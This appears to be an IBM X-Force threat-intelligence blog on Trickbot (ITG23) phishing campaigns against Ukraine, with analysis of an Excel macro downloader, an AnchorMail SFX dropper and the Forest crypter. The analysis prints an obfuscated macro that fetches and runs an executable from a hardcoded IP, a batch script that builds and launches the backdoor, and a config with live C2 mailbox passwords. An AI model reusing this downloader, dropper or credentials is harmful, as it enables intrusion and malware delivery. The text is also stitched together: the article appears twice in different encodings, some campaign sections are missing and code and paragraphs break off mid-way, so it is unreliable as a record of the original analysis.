Between mid-April and mid-June of 2022 the Trickbot group, tracked by X-Force as &lt;a href=&quot;https://securityintelligence.com/posts/itg23-crypters-cooperation-between-cybercriminal-groups/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ITG23&lt;/a&gt; and also known as Wizard Spider, DEV-0193, and the Conti group, has conducted at least six campaigns — two of which have been discovered by X-Force — against Ukraine, during which they deployed IcedID, CobaltStrike, AnchorMail, and Meterpreter. ITG23’s campaigns against Ukraine are notable due to the extent to which this activity differs from historical precedent and the fact that these campaigns appeared specifically aimed at Ukraine with some payloads that suggest a higher degree of target selection.

ITG23 is a financially motivated cybercriminal gang known primarily for developing the Trickbot banking Trojan, which was first identified in 2016; since that time the group has used its payloads to gain a foothold in victim environments for ransomware attacks, including Ryuk, Conti, and Diavol. The systematic attacks observed against Ukraine include reported and suspected phishing attacks against Ukrainian state authorities, Ukrainian individuals and organizations, and the general population. Successful attacks that resulted in data theft or ransomware would provide ITG23 with additional extortion opportunities, and particularly damaging attacks could harm Ukraine’s economy.

The observed activities reported in this blog highlight a trend of this group choosing targets that align with Russian state interests against the backdrop of the ongoing conflict. In addition to an announcement by the Conti Ransomware group (which IBM tracks as part of ITG23) that they &lt;a href=&quot;https://www.reuters.com/technology/russia-based-ransomware-group-conti-issues-warning-kremlin-foes-2022-02-25/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;would act&lt;/a&gt; in support of Russian state interests at the beginning of the invasion of Ukraine, leaked chats between ITG23 members indicated that two senior individuals within the group had &lt;a href=&quot;https://www.wired.com/story/conti-ransomware-russia/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;previously discussed&lt;/a&gt; in mid-April 2021 the targeting of entities that “work against the Russian Federation” and agreed that they were (Russian) “patriots.” Additionally, the Executive Director of Bellingcat claimed to have &lt;a href=&quot;https://twitter.com/christogrozev/status/1498387134604001285&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;received a tip&lt;/a&gt; that a cybercriminal group was in communication with Russia’s Federal Security Service (FSB).

In this article, we provide details on the six campaigns we identified and describe the new malware and tools used during these attacks.
&lt;h2&gt;Trickbot group campaigns target Ukraine&lt;/h2&gt;
X-Force analysts have investigated at least six ITG23 campaigns specifically targeting Ukraine that took place between mid-April and mid-June. Four of these campaigns have been disclosed by CERT-UA, which tracks them under the group name UAC-0098, while this analysis introduces two newly uncovered campaigns by X-Force. Following our analysis of these campaigns, X-Force assesses:
&lt;ul&gt;
 	&lt;li&gt;ITG23 itself is controlling the delivery of the emails and malware — i.e., they are not executed by independent distribution affiliates. None of these campaigns are consistent with the techniques that known ITG23 third-party distribution affiliates are using to deliver the payloads to their targets. In 2021, X-Force analysts tracked &lt;a href=&quot;https://securityintelligence.com/posts/trickbot-gang-doubles-down-enterprise-infection/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;several campaigns&lt;/a&gt; that were probably carried out directly by ITG23 personnel.&lt;/li&gt;
 	&lt;li&gt;Three of the six campaigns use a malicious Excel downloader that has not been observed in other campaigns.&lt;/li&gt;
 	&lt;li&gt;Two campaigns use ISO image files to distribute the payloads; these ISO files probably are created by a boutique ISO builder that has supplied previous campaigns delivering ITG23 payloads.&lt;/li&gt;
 	&lt;li&gt;Five of the six campaigns directly download CobaltStrike, Meterpreter, or AnchorMail onto the target machine. Typically, these payloads are downloaded later during infections commencing with malware such as Trickbot, Emotet, or IcedID, suggesting these attacks are part of targeted campaigns during which ITG23 is willing to immediately deploy higher-value backdoors.&lt;/li&gt;
 	&lt;li&gt;The CobaltStrike and IcedID payloads, which were used in four of the six campaigns, all use ITG23&#039;s Tron, Hexa, or Forest crypters. The presence of an ITG23 crypter with a sample is a strong indication that its developer, distributor, or operator may either be part of ITG23 or has a partnership with the group. Crypters are applications designed to encrypt and obfuscate malware to evade analysis by antivirus scanners and malware analysts.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Campaign #1:  ITG23 delivers IcedID in mid-April&lt;/h3&gt;
In mid-April, ITG23 used phishing emails to deliver a malicious Excel file (described in detail below) to targets in Ukraine that downloaded and installed IcedID. ITG23 has a very close &lt;a href=&quot;https://securityintelligence.com/posts/itg23-crypters-cooperation-between-cybercriminal-groups/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;relationship with the IcedID group&lt;/a&gt; dating back several years and is likely relying on IcedID to obtain initial access into a victim’s environment after having discontinued the use of Trickbot and Bazarloader as of December 2021 and February 2022, respectively. According to &lt;a href=&quot;https://cert.gov.ua/article/39609&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CERT-UA&lt;/a&gt;, the campaign targeting consisted of “mass distribution among citizens” of Ukraine, suggesting less discriminate targeting within the country. Malicious spreadsheets used the filenames &quot;Список мобілізованих громадян.xls&quot; (&quot;List of mobilized citizens.xls&quot;), &quot;Мобілізаційний список.xls&quot; (&quot;Mobilization list.xls&quot;), and &quot;Мобілізаційний реєстр.xls&quot; (&quot;Mobilization register.xls&quot;). &lt;h3&gt;Campaign #3: ITG23 delivers Meterpreter in late-April&lt;/h3&gt;

We suspect that these ISO images are being sourced from a builder using UltraISO or PyCdlib to create the disk images. ITG23 and its distribution affiliates such as Hive0107 (aka TA578) previously have sourced ISOs that are probably from this builder. In February and March, two campaigns, one of which belonged to Hive0107, used ISO images to deliver IcedID that are similar to the ISOs used in late April (Campaign #3) and late May (Campaign #5) against Ukraine. &lt;h3&gt;Campaign #4: ITG23 delivers AnchorMail in early May&lt;/h3&gt;

&lt;h2&gt;Attacks signal cyber criminal support for Russian interests&lt;/h2&gt;
ITG23 activity has previously avoided Ukrainian targets. Russian-speaking criminal underground communities have long generally discouraged if not outright banned going after former Soviet countries and—while not relevant to Ukraine—members of the Commonwealth of Independent States (CIS). This code of conduct likely came about to avoid creating victims in malware operators’ countries of residence, in large part to avoid antagonizing law enforcement. It also had the added benefit of encouraging Russian-speaking criminal cooperation based on a shared sense of us-versus-the-rest solidarity. According to &lt;a href=&quot;https://www.justice.gov/opa/pr/latvian-national-charged-alleged-role-transnational-cybercrime-organization&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;an indictment&lt;/a&gt; released by the U.S. Department of Justice (DOJ) in 2021, ITG23 (the group behind Trickbot) operated from multiple former Soviet countries, including Belarus, Russia, and Ukraine.

However, ideological divisions and allegiances have increasingly become apparent within the Russian-speaking cybercriminal ecosystem this year, with ITG23 as a primary case study. Conti Ransomware group declared a pro-Russian stance early in the conflict, &lt;a href=&quot;https://www.reuters.com/technology/russia-based-ransomware-group-conti-issues-warning-kremlin-foes-2022-02-25/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;stating their commitment&lt;/a&gt; to attack entities that would oppose Moscow. The &lt;a href=&quot;https://www.wired.com/story/conti-ransomware-russia/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ContiLeaks&lt;/a&gt;, which exposed message logs and other files exchanged between members of ITG23, were reportedly obtained and leaked by a &lt;a href=&quot;https://www.cnn.com/2022/03/30/politics/ukraine-hack-russian-ransomware-gang/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Ukrainian researcher&lt;/a&gt;.

Although we have yet to observe similar activity on a wider scale, these campaigns provide evidence that Ukraine is in the crosshairs of prominent Russian cybercriminal groups. Ukraine has been targeted with a wide variety of cyber activity leading up to and since the invasion, including &lt;a href=&quot;https://www.zscaler.com/blogs/security-research/danabot-launches-ddos-attack-against-ukrainian-ministry-defense&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;distributed-denial-of-service&lt;/a&gt; (DDoS) attacks and &lt;a href=&quot;https://www.bleepingcomputer.com/news/security/multiple-ukrainian-government-websites-hacked-and-defaced/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;defacements&lt;/a&gt; and attempted destructive activity attributed to Russian &lt;a href=&quot;https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE4Vwwd&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;state-sponsored&lt;/a&gt; actors.
&lt;h2&gt;New ITG23 malware, tools used in attacks on Ukraine&lt;/h2&gt;
X-Force analysts detected several new malware and tools employed during these campaigns:
&lt;ul&gt;
 	&lt;li&gt;A malicious Excel file used to download the payloads.&lt;/li&gt;
 	&lt;li&gt;A self-extracting archive (SFX) designed to drop and build ITG23 payloads such as AnchorMail, CobaltStrike, and IcedID.&lt;/li&gt;
 	&lt;li&gt;A new ITG23 malware crypter X-Force has dubbed “Forest.”&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Malicious Excel downloader&lt;/h3&gt;
Three of the six campaigns targeting Ukraine used similar malicious Excel downloaders. The malicious downloader code is stored as a simple macro within the Excel file which is set to run upon opening the file, providing the user has macros enabled. If macros are disabled then the malicious code is unable to run.

The macro code downloads a file from a hardcoded URL, saves it to the file system, and then executes the downloaded file. Two variants of the code are present across the analyzed samples, one which downloads an executable file which it then runs without arguments, and a second which downloads a DLL file which it then runs using the Windows rundll32 command.

The samples all make use of basic obfuscation techniques within the macro code, with some function and variable names replaced with randomly generated names, and strings values encoded in a hexadecimal ascii format and split into multiple parts. An example of one of the obfuscated macros is as follows:

&lt;code&gt;Sub Workbook_Open()
Application.ScreenUpdating = False
Dim xHttp: Set bnntwxnuvivrf = CreateObject(itslnwmojhejvmg(&quot;4d6963726f736f&quot;) &amp; itslnwmojhejvmg(&quot;66742e584d4c48545450&quot;))
Dim bStrm: Set krzbmwewmr = CreateObject(itslnwmojhejvmg(&quot;41646f64622e53747265&quot;) &amp; itslnwmojhejvmg(&quot;616d&quot;))
bnntwxnuvivrf.Open itslnwmojhejvmg(&quot;474554&quot;), itslnwmojhejvmg(&quot;687474703a2f2f3139332e3134392e3137&quot;) &amp; itslnwmojhejvmg(&quot;362e3137322f61746163686d656e742e657865&quot;), False
bnntwxnuvivrf.Send
Dim sweidpa As String
sweidpa = Environ(&quot;AppData&quot;)
With krzbmwewmr
.Type = 1
.Open
.write bnntwxnuvivrf.responseBody
.savetofile sweidpa &amp; itslnwmojhejvmg(&quot;5c736572766963657a2e&quot;) &amp; itslnwmojhejvmg(&quot;657865&quot;), 2

&lt;h3&gt;WinRAR self-extracting archive (SFX) dropper&lt;/h3&gt;
The final sample, used in the early-May attack, is particularly notable. It was observed downloading AnchorMail, which is an upgraded version of the AnchorDNS backdoor associated with the Trickbot Group (ITG23). &lt;a href=&quot;https://securityintelligence.com/posts/new-malware-trickbot-anchordns-backdoor-upgrades-anchormail/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;AnchorMail&lt;/a&gt; is notable for using an email-based C2 server which it communicates with using SMTP and IMAP protocols over TLS. The Anchor variants are stealthier backdoors, which were traditionally employed by the group during direct attacks against higher priority targets, as such, it is unusual to see an Anchor sample downloaded directly by a maldoc during the first stage of a campaign.

The AnchorMail sample is also interesting as it makes use of a previously unobserved dropper, which uses a bundled builder tool to configure and generate the AnchorMail malware binary on-the-fly.  A similar dropper has also been found in use with IcedID and CobaltStrike payloads.

In the case of the AnchorMail sample, the analyzed Dropper takes the form of a WinRAR self-extracting archive (SFX) which extracts a collection of files, including script and executable files, to the directory &lt;strong&gt;C:\windows\tasks&lt;/strong&gt; and then executes the first script file. One of the scripts is responsible for executing the AnchorMail builder tool, named &lt;strong&gt;buildDelegate_x64.exe&lt;/strong&gt;. A text file named &lt;strong&gt;conf.txt&lt;/strong&gt; is included with the dropped files and is passed to the builder as a parameter. This text file contains the desired configuration for the AnchorMail malware. The builder parses the configuration file and uses the contents to build a configuration data block for AnchorMail which it encrypts and then injects into a template DLL for the malware. The configured AnchorMail binary is then written to disk with the filename &lt;strong&gt;delegat.dll&lt;/strong&gt;.

The dropper then executes the generated &lt;strong&gt;delegat.dll&lt;/strong&gt; binary using the in-built Windows rundll32 command, and a second script is also executed which deletes the previously dropped files.

Further details about the dropper and builder tool are presented below.

The initial file executed by the dropper is the script file &lt;strong&gt;123.vbs&lt;/strong&gt;, which runs the script file &lt;strong&gt;1.bat&lt;/strong&gt;, followed by &lt;strong&gt;2.bat&lt;/strong&gt;.

File &lt;strong&gt;1.bat&lt;/strong&gt; contains the following script:

&lt;code&gt;@echo off
buildDelegate_x64.exe --conf=conf.txt --source=delegate_x64.dll --target=delegat.dll
TIMEOUT /T 3
rundll32 c:\windows\tasks\delegat.dll,dllmain
TIMEOUT /T 3&lt;/code&gt;

This script executes the file &lt;strong&gt;buildDelegate_x64.exe&lt;/strong&gt; with files &lt;strong&gt;conf.txt&lt;/strong&gt;, &lt;strong&gt;delegate_x64.dll&lt;/strong&gt; and &lt;strong&gt;delegat.dll&lt;/strong&gt; passed as parameters.

The executable file &lt;strong&gt;buildDelegate_x64.exe&lt;/strong&gt; is a builder tool for the AnchorMail malware and designed to inject a compiled template binary with specified configuration values. This allows the operators of AnchorMail to easily update the configuration of AnchorMail samples without having to recompile the malware from scratch each time. AnchorMail&#039;s predecessor, AnchorDNS, was &lt;a href=&quot;https://www.kryptoslogic.com/blog/2021/07/adjusting-the-anchor/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;observed using a similar system&lt;/a&gt;.

If executed without parameters, via the command line, &lt;strong&gt;buildDelegate_x64.exe&lt;/strong&gt; outputs the following information:

&lt;code&gt;usage:  lackeyBuilder(.exe) --conf=&lt;configure file&gt; --source=&lt;source file&gt; --target=&lt;target file&gt;
config file fields:
period=&lt;number of minutes between launch, max value (60 * 24 -1)&gt;
mail=&lt;email data&gt;
email data: {user|password|imap server[:port]|smtp server[:port]} or {destination email address}
if first symbol of server is &#039;*&#039; - not using SSL for connecting
example conf file:
period=35
mail={test@usa.com|myPwd|imap.usa.com|smtp.usa.com}
mail={test@australian.com|pwd12345|*imap.australian.com|*smtp.australian.com}
mail={sendto@mail.mail}
mail={address@mailbox.com}&lt;/code&gt;

When executed with the correct parameters, &lt;strong&gt;buildDelegate_x64.exe&lt;/strong&gt; takes the source DLL, in this case &lt;strong&gt;delegate_x64.dll&lt;/strong&gt;, which is a template for the AnchorMail malware, and modifies it with the configuration values which are specified in the file &lt;strong&gt;conf.txt&lt;/strong&gt;. The builder parses the contents of &lt;strong&gt;conf.txt&lt;/strong&gt;, and uses them to construct a configuration block for AnchorMail.

In this instance, conf.txt contains the following contents:

&lt;code&gt;period=10
mail={zakr_kurt1@15906-28547.bacloud.info|ohvohNgaeT6Shoche8Ei|15906-28547.bacloud.info|15906-28547.bacloud.info}
mail={zakr_kurt2@15906-28547.bacloud.info|doo9ahxuuBug9cuuV8ga|15906-28547.bacloud.info|15906-28547.bacloud.info}
mail={z1@15906-28547.bacloud.info}&lt;/code&gt;

The builder then generates a 16-byte XOR key and uses this to encrypt the configuration block. The configuration block and the XOR key are then injected into the template binary, which contains the marker strings &#039;YYYYYYYYYYYYYYYY&#039; and &#039;ZZZZZZZZZZZZZZZZ&#039; to indicate the locations in the binary where the configuration block and key should be written to. This updated binary is then saved as file &lt;strong&gt;delegat.dll&lt;/strong&gt;.

The script then executes the generated DLL, &lt;strong&gt;delegat.dll&lt;/strong&gt;, using the in-built Windows rundll32 command.

Finally, the script file &lt;strong&gt;2.bat&lt;/strong&gt; is executed which deletes all the dropped files except for the generated file &lt;strong&gt;delegat.dll&lt;/strong&gt;.

&lt;h3&gt;Forest crypter loads CobaltStrike, Bumblebee&lt;/h3&gt;
The Forest crypter, also known as Bumblebee loader, is a loader/crypter associated with ITG23 that has been observed in the wild since April 2022. It has so far primarily been used with the &lt;a href=&quot;https://elis531989.medium.com/the-chronicles-of-bumblebee-the-hook-the-bee-and-the-trickbot-connection-686379311056&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Bumblebee malware&lt;/a&gt;, but samples have also been found loading CobaltStrike, such as the one identified above in Campaign #5.

Forest crypter stores its payload in multiple chunks across the data sections of the binary. Each chunk of data is decrypted and combined together. The constructed data is then decrypted using XOR and a generated key, and then goes through another round of unpacking to generate the final payload binary.

The loader is capable of executing both shellcode and PE payloads, with shellcode payloads executed directly and PE payloads executed indirectly via a hooking technique. The loader installs hooks within the library functions NtOpenFile, NtCreateSection and NtMapViewOfSection, such that when these APIs are called the loader’s own functions will be executed instead. The loader will then attempt to load the library ‘gdiplus.dll’ using the LoadLibraryW API, which in turn calls the abovementioned NT APIs and triggers the hooks. The hook functions copy the unpacked payload into a newly created section and return the base address to LoadLibraryW, which proceeds to load the malicious payload thinking it is the legitimate gdiplus.dll.

<html><body><p>Following ongoing research our team, IBM Security X-Force has uncovered evidence indicating that the Russia-based cybercriminal syndicate &ldquo;Trickbot group&rdquo; has been systematically attacking Ukraine since the Russian invasion &mdash; an unprecedented shift as the group had not previously targeted Ukraine. Between mid-April and mid-June of 2022 the Trickbot group, tracked by X-Force as <a href="https://securityintelligence.com/posts/itg23-crypters-cooperation-between-cybercriminal-groups/"  target="_blank" rel="noopener nofollow" >ITG23</a> and also known as Wizard Spider, DEV-0193, and the Conti group, has conducted at least six campaigns &mdash; two of which have been discovered by X-Force &mdash; against Ukraine, during which they deployed IcedID, CobaltStrike, AnchorMail, and Meterpreter. Prior to the Russian invasion, ITG23 had not been known to target Ukraine, and much of the group&rsquo;s malware was even configured to not execute on systems if the Ukrainian language was detected.</p>
<p>ITG23&rsquo;s campaigns against Ukraine are notable due to the extent to which this activity differs from historical precedent and the fact that these campaigns appeared specifically aimed at Ukraine with some payloads that suggest a higher degree of target selection.</p>
<p>ITG23 is a financially motivated cybercriminal gang known primarily for developing the Trickbot banking Trojan, which was first identified in 2016; since that time the group has used its payloads to gain a foothold in victim environments for ransomware attacks, including Ryuk, Conti, and Diavol. The systematic attacks observed against Ukraine include reported and suspected phishing attacks against Ukrainian state authorities, Ukrainian individuals and organizations, and the general population. Successful attacks that resulted in data theft or ransomware would provide ITG23 with additional extortion opportunities, and particularly damaging attacks could harm Ukraine&rsquo;s economy.</p>
<p>The observed activities reported in this blog highlight a trend of this group choosing targets that align with Russian state interests against the backdrop of the ongoing conflict. In addition to an announcement by the Conti Ransomware group (which IBM tracks as part of ITG23) that they <a href="https://www.reuters.com/technology/russia-based-ransomware-group-conti-issues-warning-kremlin-foes-2022-02-25/" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >would act</a> in support of Russian state interests at the beginning of the invasion of Ukraine, leaked chats between ITG23 members indicated that two senior individuals within the group had <a href="https://www.wired.com/story/conti-ransomware-russia/" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >previously discussed</a> in mid-April 2021 the targeting of entities that &ldquo;work against the Russian Federation&rdquo; and agreed that they were (Russian) &ldquo;patriots.&rdquo; Additionally, the Executive Director of Bellingcat claimed to have <a href="https://twitter.com/christogrozev/status/1498387134604001285" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >received a tip</a> that a cybercriminal group was in communication with Russia&rsquo;s Federal Security Service (FSB).</p>
<p>While investigating these campaigns, X-Force analysts also spotted new malware and tools being used by ITG23: a malicious Excel downloader used to deliver the payloads, a self-extracting archive (SFX) designed to drop and build ITG23 payloads such as AnchorMail, and a malware crypter X-Force has dubbed &ldquo;Forest&rdquo;. Of note, the Forest crypter has also been used with the <a href="https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >Bumblebee malware</a>, providing further evidence that ITG23 is behind Bumblebee. In this article, we provide details on the six campaigns we identified and describe the new malware and tools used during these attacks.</p>
<h2>Trickbot group campaigns target Ukraine</h2>
<p>X-Force analysts have investigated at least six ITG23 campaigns specifically targeting Ukraine that took place between mid-April and mid-June. Four of these campaigns have been disclosed by CERT-UA, which tracks them under the group name UAC-0098, while this analysis introduces two newly uncovered campaigns by X-Force. Following our analysis of these campaigns, X-Force assesses:</p>
<ul>
<li>ITG23 itself is controlling the delivery of the emails and malware &mdash; i.e., they are not executed by independent distribution affiliates. None of these campaigns are consistent with the techniques that known ITG23 third-party distribution affiliates are using to deliver the payloads to their targets. In 2021, X-Force analysts tracked <a href="https://securityintelligence.com/posts/trickbot-gang-doubles-down-enterprise-infection/"  target="_blank" rel="noopener nofollow" >several campaigns</a> that were probably carried out directly by ITG23 personnel.</li>
<li>Three of the six campaigns use a malicious Excel downloader that has not been observed in other campaigns.</li>
<li>Two campaigns use ISO image files to distribute the payloads; these ISO files probably are created by a boutique ISO builder that has supplied previous campaigns delivering ITG23 payloads.</li>
<li>Five of the six campaigns directly download CobaltStrike, Meterpreter, or AnchorMail onto the target machine. Typically, these payloads are downloaded later during infections commencing with malware such as Trickbot, Emotet, or IcedID, suggesting these attacks are part of targeted campaigns during which ITG23 is willing to immediately deploy higher-value backdoors.</li>
<li>The CobaltStrike and IcedID payloads, which were used in four of the six campaigns, all use ITG23&rsquo;s Tron, Hexa, or Forest crypters. The presence of an ITG23 crypter with a sample is a strong indication that its developer, distributor, or operator may either be part of ITG23 or has a partnership with the group. Crypters are applications designed to encrypt and obfuscate malware to evade analysis by antivirus scanners and malware analysts.</li>
</ul>
<h3>Campaign #1: &nbsp;ITG23 delivers IcedID in mid-April</h3>
<p>In mid-April, ITG23 used phishing emails to deliver a malicious Excel file (described in detail below) to targets in Ukraine that downloaded and installed IcedID. ITG23 has a very close <a href="https://securityintelligence.com/posts/itg23-crypters-cooperation-between-cybercriminal-groups/"  target="_blank" rel="noopener nofollow" >relationship with the IcedID group</a> dating back several years and is likely relying on IcedID to obtain initial access into a victim&rsquo;s environment after having discontinued the use of Trickbot and Bazarloader as of December 2021 and February 2022, respectively. According to <a href="https://cert.gov.ua/article/39609" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >CERT-UA</a>, the campaign targeting consisted of &ldquo;mass distribution among citizens&rdquo; of Ukraine, suggesting less discriminate targeting within the country. Malicious spreadsheets used the filenames &ldquo;&#1057;&#1087;&#1080;&#1089;&#1086;&#1082; &#1084;&#1086;&#1073;&#1110;&#1083;&#1110;&#1079;&#1086;&#1074;&#1072;&#1085;&#1080;&#1093; &#1075;&#1088;&#1086;&#1084;&#1072;&#1076;&#1103;&#1085;.xls&rdquo; (&ldquo;List of mobilized citizens.xls&rdquo;), &ldquo;&#1052;&#1086;&#1073;&#1110;&#1083;&#1110;&#1079;&#1072;&#1094;&#1110;&#1081;&#1085;&#1080;&#1081; &#1089;&#1087;&#1080;&#1089;&#1086;&#1082;.xls&rdquo; (&ldquo;Mobilization list.xls&rdquo;), and &ldquo;&#1052;&#1086;&#1073;&#1110;&#1083;&#1110;&#1079;&#1072;&#1094;&#1110;&#1081;&#1085;&#1080;&#1081; &#1088;&#1077;&#1108;&#1089;&#1090;&#1088;.xls&rdquo; (&ldquo;Mobilization register.xls&rdquo;). <h3>Campaign #3: ITG23 delivers Meterpreter in late-April</h3>
<p>In late April, <a href="https://cert.gov.ua/article/39934" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >CERT-UA</a> released details of a phishing campaign delivering Meterpreter which they assessed was associated with the Trickbot group. The campaign used emails with the subject &ldquo;&#1059;&#1082;&#1072;s &#1055;&#1088;&#1077;s&#1110;&#1077;&#1084;&#1072; &#1059;&#1074;&#1088;&#1072;&#1094;&#1087; No 576/22 &#1087;&#1088;&#1086; &#1073;&#1077;&#1079;&#1087;&#1088;&#1077;&#1094;ta&#1077;&#1084;&#1085;&#1110; &#1079;&#1072;&#1093;&#1086;&#1076;&#1087; &#1073;&#1077;&#1079;&#1087;&#1077;&#1082;&#1087;&rdquo; (&ldquo;Decree of the Press Office of the European Union No. 576/22 on uninterrupted security measures&rdquo;) to deliver an ISO image file. &nbsp;CERT-UA stated that the attack was against &ldquo;the state authorities of Ukraine.&rdquo; Similar to campaign #2, the reported targeting of state organizations and direct download of Meterpreter suggest this campaign was directed at specific targets.</p>
<p>X-Force analysts have uncovered additional information tying this ISO image file and campaign to ITG23. CERT-UA describes an execution sequence in which the embedded Microsoft Shortcut (LNK) file executes a PowerShell script &ldquo;z.ps1&rdquo; using the command &ldquo;-exec bypass -w h -file z.ps1&rdquo; that drops a Ukrainian-themed decoy document and executes the Meterpreter executable (b.exe). &nbsp;A nearly identical execution sequence was used during an ITG23 campaign against Ukraine in late May (Campaign #5) described further below.</p>
<p>We suspect that these ISO images are being sourced from a builder using UltraISO or PyCdlib to create the disk images. ITG23 and its distribution affiliates such as Hive0107 (aka TA578) previously have sourced ISOs that are probably from this builder. In February and March, two campaigns, one of which belonged to Hive0107, used ISO images to deliver IcedID that are similar to the ISOs used in late April (Campaign #3) and late May (Campaign #5) against Ukraine. For example:</p>
<ul>
<li>Both ISOs contain LNK files created on the same machine &ldquo;desktop-ouvurbp&rdquo; and with other identical metadata.</li>
<li>Both ISOs use the same PowerShell command identified in April: &ldquo;-exec bypass -w h -file z.ps1&rdquo;.</li>
<li>The PowerShell script used in March is similar to those used in Campaigns #3 and #5 using the &ldquo;Start-Process&rdquo; command to drop a decoy document and execute a PE file.</li>
</ul>

<h3>Campaign #4: ITG23 delivers AnchorMail in early May</h3>
<p>In early May, X-Force discovered a campaign using a malicious Excel file very similar to those used in the first two campaigns that downloaded <a href="https://securityintelligence.com/posts/new-malware-trickbot-anchordns-backdoor-upgrades-anchormail/"  target="_blank" rel="noopener nofollow" >AnchorMail</a>, a backdoor developed by ITG23 and based on their AnchorDNS malware. It is unusual to see Anchor backdoors downloaded directly as the first stage of an attack; typically, they are installed later in the infection. Their use suggests that this campaign may have been targeted against specific individuals or organizations, although we lack information on the specific target set.</p>
<p>The spreadsheet was uploaded to the VirusTotal repository on May 5 from Ukraine with the name Nuclear.xls &ndash; suggesting an alarming lure. &nbsp;The file was downloaded from a domain using the Ukrainian country code top-level domain: &ldquo;lviv.uz[.]ua&rdquo;. When executed, the spreadsheet downloads a WinRAR self-extracting archive (SFX) (see below for additional details) that delivers the AnchorMail backdoor. We have also identified other ITG23 payloads using this SFX as part of their installation sequence, including IcedID and CobaltStrike.</p>

<h2>Attacks signal cyber criminal support for Russian interests</h2>
<p>ITG23 activity has previously avoided Ukrainian targets. Russian-speaking criminal underground communities have long generally discouraged if not outright banned going after former Soviet countries and&mdash;while not relevant to Ukraine&mdash;members of the Commonwealth of Independent States (CIS). This code of conduct likely came about to avoid creating victims in malware operators&rsquo; countries of residence, in large part to avoid antagonizing law enforcement. It also had the added benefit of encouraging Russian-speaking criminal cooperation based on a shared sense of us-versus-the-rest solidarity. According to <a href="https://www.justice.gov/opa/pr/latvian-national-charged-alleged-role-transnational-cybercrime-organization" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >an indictment</a> released by the U.S. Department of Justice (DOJ) in 2021, ITG23 (the group behind Trickbot) operated from multiple former Soviet countries, including Belarus, Russia, and Ukraine.</p>
<p>However, ideological divisions and allegiances have increasingly become apparent within the Russian-speaking cybercriminal ecosystem this year, with ITG23 as a primary case study. Conti Ransomware group declared a pro-Russian stance early in the conflict, <a href="https://www.reuters.com/technology/russia-based-ransomware-group-conti-issues-warning-kremlin-foes-2022-02-25/" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >stating their commitment</a> to attack entities that would oppose Moscow. The <a href="https://www.wired.com/story/conti-ransomware-russia/" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >ContiLeaks</a>, which exposed message logs and other files exchanged between members of ITG23, were reportedly obtained and leaked by a <a href="https://www.cnn.com/2022/03/30/politics/ukraine-hack-russian-ransomware-gang/index.html" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >Ukrainian researcher</a>.</p>
<p>Although we have yet to observe similar activity on a wider scale, these campaigns provide evidence that Ukraine is in the crosshairs of prominent Russian cybercriminal groups. Ukraine has been targeted with a wide variety of cyber activity leading up to and since the invasion, including <a href="https://www.zscaler.com/blogs/security-research/danabot-launches-ddos-attack-against-ukrainian-ministry-defense" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >distributed-denial-of-service</a> (DDoS) attacks and <a href="https://www.bleepingcomputer.com/news/security/multiple-ukrainian-government-websites-hacked-and-defaced/" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >defacements</a> and attempted destructive activity attributed to Russian <a href="https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE4Vwwd" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >state-sponsored</a> actors.</p>

<h3>Malicious Excel downloader</h3>
<p>Three of the six campaigns targeting Ukraine used similar malicious Excel downloaders. The malicious downloader code is stored as a simple macro within the Excel file which is set to run upon opening the file, providing the user has macros enabled. <p>The macro code downloads a file from a hardcoded URL, saves it to the file system, and then executes the downloaded file. <h3>WinRAR self-extracting archive (SFX) dropper</h3>
<p>The final sample, used in the early-May attack, is particularly notable. It was observed downloading AnchorMail, which is an upgraded version of the AnchorDNS backdoor associated with the Trickbot Group (ITG23). <a href="https://securityintelligence.com/posts/new-malware-trickbot-anchordns-backdoor-upgrades-anchormail/"  target="_blank" rel="noopener nofollow" >AnchorMail</a> is notable for using an email-based C2 server which it communicates with using SMTP and IMAP protocols over TLS. The Anchor variants are stealthier backdoors, which were traditionally employed by the group during direct attacks against higher priority targets, as such, it is unusual to see an Anchor sample downloaded directly by a maldoc during the first stage of a campaign.</p>
<p>The AnchorMail sample is also interesting as it makes use of a previously unobserved dropper, which uses a bundled builder tool to configure and generate the AnchorMail malware binary on-the-fly. &nbsp;A similar dropper has also been found in use with IcedID and CobaltStrike payloads.</p>
